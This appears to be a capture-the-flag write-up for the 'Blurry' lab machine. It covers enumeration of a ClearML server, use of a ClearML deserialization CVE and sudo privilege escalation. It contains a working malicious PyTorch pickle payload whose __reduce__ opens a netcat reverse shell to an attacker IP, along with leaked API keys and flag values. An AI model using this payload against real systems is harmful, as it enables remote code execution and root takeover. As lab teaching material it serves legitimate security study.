@@ -1,0 +1,202 @@
+Blurry: Vulnerabilities: ClearML CVE, malicious file upload, and exploitation of sudo binary
+
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.54.172
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://app.blurry.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+echo 10.129.54.172 app.blurry.htb | sudo tee -a /etc/hosts
+
+http://app.blurry.htb/login - takes me to a login page with “ClearML”
+
+https://github.com/allegroai/clearml/stargazers 
+
+http://app.blurry.htb/dashboard - after you put in a name, you go here
+
+http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/46ed872f93b546858d81b7f8f6051ab5/execution?columns=selected&columns=type&columns=name&columns=tags&columns=status&columns=project.name&columns=users&columns=started&columns=last_update&columns=last_iteration&columns=parent.name&order=-last_update&filter= 
+
+“clearml == 1.13.1” 
+“Auto-generated at 2024-06-03 13:22:03 UTC by jippity@blurry “
+
+gobuster vhost -u http://app.blurry.htb/ -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain - No results
+
+Found more information on webpage
+%env CLEARML_WEB_HOST=http://app.blurry.htb
+%env CLEARML_API_HOST=http://api.blurry.htb
+%env CLEARML_FILES_HOST=http://files.blurry.htb
+%env CLEARML_API_ACCESS_KEY=<You’re API access key>
+%env CLEARML_API_SECRET_KEY=<You’re API secret key>
+
+echo 10.129.54.172 api.blurry.htb | sudo tee -a /etc/hosts
+echo 10.129.54.172 files.blurry.htb | sudo tee -a /etc/hosts
+
+http://files.blurry.htb/ - says “ok” as I sent HTTP GET for it.
+
+Follow the tutorial on the webpage to get started with clearML:
+pip install virtualenv 
+
+python3 -m venv .env
+
+source .env/bin/activate
+
+pip install clearml
+clearml-init
+#Then past the config
+
+Paste this from the web server:
+
+api {
+  web_server: http://app.blurry.htb
+  api_server: http://api.blurry.htb
+  files_server: http://files.blurry.htb
+  credentials {
+    "access_key" = "4N2G5R21K230OZYL7T88"
+    "secret_key" = "sT9PSKNj5uEGeTKzrjY0YMRxAzIAYujV7S9kJinBfTKoIG1qG5"
+  }
+}
+
+
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24590 
+
+“Deserialization of untrusted data can occur in versions 0.17.0 to 1.14.2 of the client SDK of Allegro AI&#8217;s ClearML platform, enabling a maliciously uploaded artifact to run arbitrary code on an end user&#8217;s system when interacted with.”
+
+https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit/tree/main 
+
+
+We used this script here:
+
+jippity@blurry:~$ cat user.txt
+cat user.txt
+53841b566791298656e992adb1641baf
+
+
+Found this in the clearml.conf
+
+credentials {"access_key": "8TL83TDO2YXCQ4789DE4", "secret_key": "peFoHVcUTMA0JdhOHNoQTioLSmtbKEiAVxZXJSHku4LyHlOTUB"}
+
+Privilege Escalation:
+
+jippity@blurry:~$ sudo -l
+sudo -l
+Matching Defaults entries for jippity on blurry:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jippity may run the following commands on blurry:
+    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
+
+jippity@blurry:/usr/bin$ ls -la evaluate_model
+ls -la evaluate_model
+-rwxr-xr-x 1 root root 1537 Feb 17 13:18 evaluate_model
+
+jippity@blurry:/usr/bin$ cat evaluate_model
+cat evaluate_model
+#!/bin/bash
+# Evaluate a given model against our proprietary dataset.
+# Security checks against model file included.
+
+if [ "$#" -ne 1 ]; then
+    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
+    exit 1
+fi
+
+MODEL_FILE="$1"
+TEMP_DIR="/models/temp"
+PYTHON_SCRIPT="/models/evaluate_model.py"  
+
+/usr/bin/mkdir -p "$TEMP_DIR"
+
+file_type=$(/usr/bin/file --brief "$MODEL_FILE")
+
+# Extract based on file type
+if [[ "$file_type" == *"POSIX tar archive"* ]]; then
+    # POSIX tar archive (older PyTorch format)
+    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
+elif [[ "$file_type" == *"Zip archive data"* ]]; then
+    # Zip archive (newer PyTorch format)
+    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
+else
+    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
+    exit 2
+fi
+
+/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
+    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")
+
+    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
+        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
+        /bin/rm "$MODEL_FILE"
+        break
+    fi
+done
+
+/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
+/bin/rm -rf "$TEMP_DIR"
+
+if [ -f "$MODEL_FILE" ]; then
+    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
+    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
+    
+Fi
+
+-This script uses evaluate_models to check if the .pth file is malicious. 
+
+jippity@blurry:/models$ ls -al      	
+ls -al
+total 1068
+drwxrwxr-x  2 root jippity    4096 Jun 17 14:11 .
+drwxr-xr-x 19 root root       4096 Jun  3 09:28 ..
+-rw-r--r--  1 root root    1077880 May 30 04:39 demo_model.pth
+-rw-r--r--  1 root root       2547 May 30 04:38 evaluate_model.py
+
+
+Use this script called killer.py to create a malicious model to upload reverse shell in sudo privileges:
+
+import torch
+import torch.nn as nn
+import os
+
+class MaliciousModel(nn.Module):
+    # PyTorch's base class for all neural network modules
+    def __init__(self):
+        super(MaliciousModel, self).__init__()
+        self.dense = nn.Linear(10, 1)
+    
+    # Define how the data flows through the model
+    def forward(self, heem): # Passes input through the linear layer.
+        return self.dense(heem)
+   
+    # Overridden __reduce__ Method
+    def __reduce__(self):
+        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.217 4444 >/tmp/f"
+        return os.system, (cmd,)
+
+# Create an instance of the model
+malicious_model = MaliciousModel()
+
+# Save the model using torch.save
+torch.save(malicious_model, 'heem.pth')
+
+wget http://10.10.14.217:8001/heem.pth after running the script above
+
+jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/heem.pth
+sudo /usr/bin/evaluate_model /models/heem.pth
+[+] Model /models/heem.pth is considered safe. Processing...
+rm: cannot remove '/tmp/f': No such file or directory
+
+Now we have root access
+
+# cat root.txt
+93b6f0bd9e7f39ecaa7b46ab25431446
+
